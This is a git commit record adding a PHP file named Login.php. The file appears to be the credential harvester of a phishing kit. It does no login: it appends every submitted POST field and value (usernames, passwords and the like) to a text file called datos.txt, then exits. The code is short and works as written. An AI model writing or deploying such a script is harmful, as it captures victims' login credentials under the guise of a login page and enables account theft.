5b48f5c74f5c173c1413a55c9e8657a2653a26b5
Juan Diego Martínez Camacho <juandmcamacho@gmail.com>
2017-10-12 23:08:13 -0500

    Add files via upload

---
+++ Login.php
@@ -0,0 +1,14 @@
+<?php
+$handle = fopen("../datos.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "--------------------------------------------------------------");
+fwrite($handle, "\r\n");
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
